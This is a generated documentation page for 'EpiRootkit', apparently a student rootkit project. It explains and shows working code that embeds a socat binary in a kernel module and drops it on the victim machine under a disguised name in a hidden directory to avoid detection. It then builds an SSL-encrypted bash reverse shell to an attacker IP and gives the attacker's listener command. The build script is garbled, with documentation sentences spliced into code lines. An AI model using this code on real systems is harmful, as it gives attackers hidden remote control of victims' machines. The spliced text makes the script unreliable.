<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Reverse Shell</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">By STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('dd/de6/reverse.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Reverse Shell</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><ul><ul><li class="level3"><a href="#autotoc_md70">Loading socat into the module as payload</a></li>
</ul>
<li class="level2"><a href="#autotoc_md71">Implementation</a><ul><li class="level3"><a href="#autotoc_md72">Dropping the binary on target machine</a></li>
<li class="level3"><a href="#autotoc_md73">Reverse shell execution</a></li>
<li class="level3"><a href="#reverse-shell-reception">Connection reception by attacker</a></li>
</ul>
</li>
</ul>
</ul>
</div>
<div class="textblock"><p>{#reverse-shell-doc} As part of our project, we implemented a reverse shell using <code>socat</code> to establish an SSL-encrypted connection to the attack server. The choice of <code>socat</code> is motivated by its ability to provide a complete interactive shell, unlike simpler tools like <code>netcat</code> or even simply <code>bash</code>. To ensure the presence of <code>socat</code> on the system, we integrated the binary directly into the rootkit, which allows dropping it dynamically when mounting the rootkit. This requires having a static version of <code>socat</code> that also embeds SSL, dumping this binary into the rootkit to finally be able to use it to establish the reverse shell.</p>
<h3><a class="anchor" id="autotoc_md70"></a>
Loading socat into the module as payload</h3>
<h2><a class="anchor" id="autotoc_md71"></a>
Implementation</h2>
<p>To load the <code>socat</code> binary into the rootkit, we use a script during module compilation. This script extracts the <code>socat</code> binary and converts it into a C character array, which is then integrated into the module's source code.</p>
<p>Uses the statically compiled <code>socat</code> binary embedded in the rootkit module.</p>
<div class="fragment"><div class="line">generate_socat_h() {## SSL/TLS</div>
<div class="line"> </div>
<div class="line">  # if socat file does not exist, download it</div>
<div class="line"> </div>
<div class="line">  if [ ! -f socat ]; thenThe reverse shell connection is encrypted using SSL/TLS for secure communication.</div>
<div class="line"> </div>
<div class="line">    echo &quot;socat binary not found.&quot;</div>
<div class="line"> </div>
<div class="line">    echo &quot;Download static socat binary from github.com/ernw/static-toolbox&quot;## Usage</div>
<div class="line"> </div>
<div class="line">    wget https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.4/socat-1.7.4.4-x86_64 -O socat</div>
<div class="line"> </div>
<div class="line">    if [ $? -ne 0 ]; thenLaunch with `getshell [port]` command (default port: 9001).</div>
<div class="line"> </div>
<div class="line">      echo &quot;Failed to download socat binary.&quot;</div>
<div class="line">      exit 1</div>
<div class="line">    fi</div>
<div class="line">    echo &quot;Download complete.&quot;</div>
<div class="line">  fi</div>
<div class="line">  echo &quot;Hexdumping socat to socat.h&quot;</div>
<div class="line">  xxd -i socat &gt; include/socat.h</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line"># Check if socat.h exists</div>
<div class="line">if [ ! -f ./include/socat.h ]; then</div>
<div class="line">  echo &quot;socat.h not found, generating it...&quot;</div>
<div class="line">  generate_socat_h</div>
<div class="line">else</div>
<div class="line">  echo &quot;socat.h already exists, skipping generation.&quot;</div>
<div class="line">fi</div>
</div><!-- fragment --><p>Following this, we finally obtain a <code>socat.h</code> file containing the following code:</p>
<div class="fragment"><div class="line"><span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code hl_namespace" href="../../d7/deb/namespacesocat.html">socat</a>[] = {</div>
<div class="line">  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,</div>
<div class="line">  <span class="comment">// ... (rest of socat binary)</span></div>
<div class="line">};</div>
<div class="line"><span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> socat_len = 123456; <span class="comment">// Length of socat binary</span></div>
<div class="ttc" id="anamespacesocat_html"><div class="ttname"><a href="../../d7/deb/namespacesocat.html">socat</a></div><div class="ttdef"><b>Definition</b> <a href="../../dc/d0f/socat_8py_source.html#l00001">socat.py:1</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md72"></a>
Dropping the binary on target machine</h3>
<p>The <code>socat</code> binary is dropped on the target machine thanks to the <code><a class="el" href="../../d0/dcb/epirootkit_8h.html#ab52214334a951111280d1dafed68ebeb">drop_socat_binaire(void)</a></code> function:</p>
<div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d0/dcb/epirootkit_8h.html#ab52214334a951111280d1dafed68ebeb">drop_socat_binaire</a>(<span class="keywordtype">void</span>) {</div>
<div class="line">    <span class="keywordflow">if</span> (<a class="code hl_function" href="../../d9/d7f/socat_8c.html#a1df1aad637db243a384591117976dd5f">is_socat_binaire_dropped</a>()) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: socat binary already dropped\n&quot;</span>);</div>
<div class="line">        <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line">    }</div>
<div class="line"> </div>
<div class="line">    <span class="keyword">struct </span><a class="code hl_variable" href="../../d9/dea/epikeylog_8c.html#adab6074303433063cef2fbd657dcba0b">file</a> *f;</div>
<div class="line">    loff_t pos = 0;</div>
<div class="line"> </div>
<div class="line">    f = filp_open(<a class="code hl_define" href="../../db/d16/config_8h.html#af753744ebbde3de160015065612ca9ac">SOCAT_BINARY_PATH</a>, O_WRONLY | O_CREAT | O_TRUNC, 0700);</div>
<div class="line">    <span class="keywordflow">if</span> (IS_ERR(f)) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: failed to open file: %ld\n&quot;</span>, PTR_ERR(f));</div>
<div class="line">        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">    }</div>
<div class="line"> </div>
<div class="line">    <span class="keywordtype">unsigned</span> <span class="keywordtype">int</span> written = kernel_write(f, <a class="code hl_namespace" href="../../d7/deb/namespacesocat.html">socat</a>, socat_len, &amp;pos);</div>
<div class="line">    <span class="keywordflow">if</span> (written &lt; 0) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: kernel_write failed: %u\n&quot;</span>, written);</div>
<div class="line">        filp_close(f, NULL);</div>
<div class="line">        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">    }</div>
<div class="line">    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (written &lt; socat_len) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: only %u bytes written, expected %u\n&quot;</span>, written, socat_len);</div>
<div class="line">        filp_close(f, NULL);</div>
<div class="line">        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">    }</div>
<div class="line">    <span class="keywordflow">else</span> {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;socat written successfully (%u bytes)\n&quot;</span>, written);</div>
<div class="line">    }</div>
<div class="line"> </div>
<div class="line">    filp_close(f, NULL);</div>
<div class="line"> </div>
<div class="line">    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_a28aac7cd72bc6ccb4340f7985d0d5449"><div class="ttname"><a href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a></div><div class="ttdeci">#define ERR_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00016">config.h:16</a></div></div>
<div class="ttc" id="aconfig_8h_html_a317bf780ec5da5b783e9979da34a878d"><div class="ttname"><a href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a></div><div class="ttdeci">#define DBG_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00015">config.h:15</a></div></div>
<div class="ttc" id="aconfig_8h_html_a6d58f9ac447476b4e084d7ca383f5183"><div class="ttname"><a href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a></div><div class="ttdeci">#define FAILURE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00006">config.h:6</a></div></div>
<div class="ttc" id="aconfig_8h_html_aa90cac659d18e8ef6294c7ae337f6b58"><div class="ttname"><a href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a></div><div class="ttdeci">#define SUCCESS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00005">config.h:5</a></div></div>
<div class="ttc" id="aconfig_8h_html_af753744ebbde3de160015065612ca9ac"><div class="ttname"><a href="../../db/d16/config_8h.html#af753744ebbde3de160015065612ca9ac">SOCAT_BINARY_PATH</a></div><div class="ttdeci">#define SOCAT_BINARY_PATH</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00024">config.h:24</a></div></div>
<div class="ttc" id="aepikeylog_8c_html_adab6074303433063cef2fbd657dcba0b"><div class="ttname"><a href="../../d9/dea/epikeylog_8c.html#adab6074303433063cef2fbd657dcba0b">file</a></div><div class="ttdeci">static struct dentry * file</div><div class="ttdef"><b>Definition</b> <a href="../../d9/dea/epikeylog_8c_source.html#l00145">epikeylog.c:145</a></div></div>
<div class="ttc" id="aepirootkit_8h_html_ab52214334a951111280d1dafed68ebeb"><div class="ttname"><a href="../../d0/dcb/epirootkit_8h.html#ab52214334a951111280d1dafed68ebeb">drop_socat_binaire</a></div><div class="ttdeci">int drop_socat_binaire(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d7f/socat_8c_source.html#l00032">socat.c:32</a></div></div>
<div class="ttc" id="asocat_8c_html_a1df1aad637db243a384591117976dd5f"><div class="ttname"><a href="../../d9/d7f/socat_8c.html#a1df1aad637db243a384591117976dd5f">is_socat_binaire_dropped</a></div><div class="ttdeci">static int is_socat_binaire_dropped(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d7f/socat_8c_source.html#l00019">socat.c:19</a></div></div>
</div><!-- fragment --><p>This function first checks if the binary has already been dropped, then creates and writes the content of the <code>socat</code> array (containing the binary) to the location defined by <code>SOCAT_BINARY_PATH</code>. It also handles potential errors during writing and ensures that the entire binary is properly written to disk.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Binary obfuscation and discretion</b> By default, the <code>socat</code> file dropped on the target machine is renamed with the <code>.sysd</code> extension to add a first layer of obfuscation. Moreover, it's placed in the rootkit's hidden directory, making it practically invisible to a regular user or system administrator. This choice aims to limit detection risks of the binary by analysis tools or during manual file system inspection. </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md73"></a>
Reverse shell execution</h3>
<p>To execute the reverse shell, we use the <code><a class="el" href="../../d0/dcb/epirootkit_8h.html#af02d46871d795eb9ab17ab2d735491ec">launch_reverse_shell(char *args)</a></code> function:</p>
<div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d0/dcb/epirootkit_8h.html#af02d46871d795eb9ab17ab2d735491ec">launch_reverse_shell</a>(<span class="keywordtype">char</span> *args) {</div>
<div class="line">  <span class="keywordflow">if</span> (!<a class="code hl_function" href="../../d9/d7f/socat_8c.html#a1df1aad637db243a384591117976dd5f">is_socat_binaire_dropped</a>()) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;launch_reverse_shell: socat binary not dropped\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <span class="keywordtype">int</span> <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a> = <a class="code hl_define" href="../../db/d16/config_8h.html#af5e15f8236c0196237c7a7525b956778">REVERSE_SHELL_PORT</a>; <span class="comment">// Default port</span></div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Get port</span></div>
<div class="line">  <span class="keywordflow">if</span> (args &amp;&amp; strlen(args) &gt; 0)</div>
<div class="line">    <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a> = simple_strtol(args, NULL, 10);</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Build socat command with specified port</span></div>
<div class="line">  <span class="keywordtype">char</span> cmd[256];</div>
<div class="line">  snprintf(cmd, <span class="keyword">sizeof</span>(cmd), <span class="stringliteral">&quot;%s exec:&#39;bash -i&#39;,pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &amp;&quot;</span>,</div>
<div class="line">          <a class="code hl_define" href="../../db/d16/config_8h.html#af753744ebbde3de160015065612ca9ac">SOCAT_BINARY_PATH</a>, <a class="code hl_variable" href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a>, <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Launch command</span></div>
<div class="line">  <span class="keywordtype">int</span> ret_code = <a class="code hl_define" href="../../d0/dcb/epirootkit_8h.html#a2509f715445905a8233750714bc2f515">exec_str_as_command</a>(cmd, <span class="keyword">false</span>);</div>
<div class="line"> </div>
<div class="line">  <span class="keywordflow">if</span> (ret_code &lt; 0) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;launch_reverse_shell: failed to start reverse shell on port %d\n&quot;</span>, <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line">    <span class="keywordflow">return</span> ret_code;</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;launch_reverse_shell: reverse shell started on port %d\n&quot;</span>, <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line">  <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_a63c89c04d1feae07ca35558055155ffb"><div class="ttname"><a href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a></div><div class="ttdeci">int port</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00007">main.c:7</a></div></div>
<div class="ttc" id="aconfig_8h_html_af5e15f8236c0196237c7a7525b956778"><div class="ttname"><a href="../../db/d16/config_8h.html#af5e15f8236c0196237c7a7525b956778">REVERSE_SHELL_PORT</a></div><div class="ttdeci">#define REVERSE_SHELL_PORT</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00025">config.h:25</a></div></div>
<div class="ttc" id="aconfig_8h_html_afbc356cd0e25d1dbbece7c10fd025fa6"><div class="ttname"><a href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a></div><div class="ttdeci">char * ip</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00006">main.c:6</a></div></div>
<div class="ttc" id="aepirootkit_8h_html_a2509f715445905a8233750714bc2f515"><div class="ttname"><a href="../../d0/dcb/epirootkit_8h.html#a2509f715445905a8233750714bc2f515">exec_str_as_command</a></div><div class="ttdeci">#define exec_str_as_command(user_cmd, catch_stds)</div><div class="ttdef"><b>Definition</b> <a href="../../d0/dcb/epirootkit_8h_source.html#l00037">epirootkit.h:37</a></div></div>
<div class="ttc" id="aepirootkit_8h_html_af02d46871d795eb9ab17ab2d735491ec"><div class="ttname"><a href="../../d0/dcb/epirootkit_8h.html#af02d46871d795eb9ab17ab2d735491ec">launch_reverse_shell</a></div><div class="ttdeci">int launch_reverse_shell(char *args)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d7f/socat_8c_source.html#l00083">socat.c:83</a></div></div>
</div><!-- fragment --><p>This function first checks that the <code>socat</code> binary has been properly dropped. It then retrieves the port to use (default or passed as argument), builds the reverse shell execution command with <code>socat</code>, then executes it via <code>exec_str_as_command</code>. Errors are handled and a success message is displayed if the shell is launched correctly.</p>
<p><b>Explanation of the <code>socat</code> command used:</b> </p><div class="fragment"><div class="line">socat exec:&#39;bash -i&#39;,pty,stderr,setsid,sigint,sane openssl-connect:IP:PORT,verify=0 &amp;</div>
</div><!-- fragment --><p> This <code>socat</code> command establishes an SSL connection to the specified IP and port, while redirecting standard input and output to an interactive <code>bash</code> shell. The options used are: </p><table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Option   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>exec:bash -i</code>   </td><td class="markdownTableBodyNone">Executes an interactive shell.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>pty</code>   </td><td class="markdownTableBodyNone">Allocates a pseudo-terminal for the shell.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>stderr</code>   </td><td class="markdownTableBodyNone">Redirects errors to standard output.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>setsid</code>   </td><td class="markdownTableBodyNone">Detaches the process from the terminal.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>sigint</code>   </td><td class="markdownTableBodyNone">Handles interrupt signals.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>sane</code>   </td><td class="markdownTableBodyNone">Resets terminal parameters for standard behavior.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>openssl-connect:IP:PORT</code>   </td><td class="markdownTableBodyNone">Establishes SSL connection to specified IP and port.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>verify=0</code>   </td><td class="markdownTableBodyNone">Disables SSL certificate verification (useful for tests, but avoid in production).   </td></tr>
</table>
<p>In summary, this command generates a custom shell allowing maximum interactivity and functionality, while being secured by SSL.</p>
<h3><a class="anchor" id="reverse-shell-reception"></a>
Connection reception by attacker</h3>
<p>To receive the reverse shell connection, the attacker must execute the following command on their server:</p>
<div class="fragment"><div class="line">socat openssl-listen:PORT,cert=server.pem,verify=0,fork -</div>
</div><!-- fragment --><p>Where <code>PORT</code> is the port specified when launching the reverse shell on the victim, and <code>server.pem</code> is the SSL certificate used for the encrypted connection.</p>
<p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/> </p>
</div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
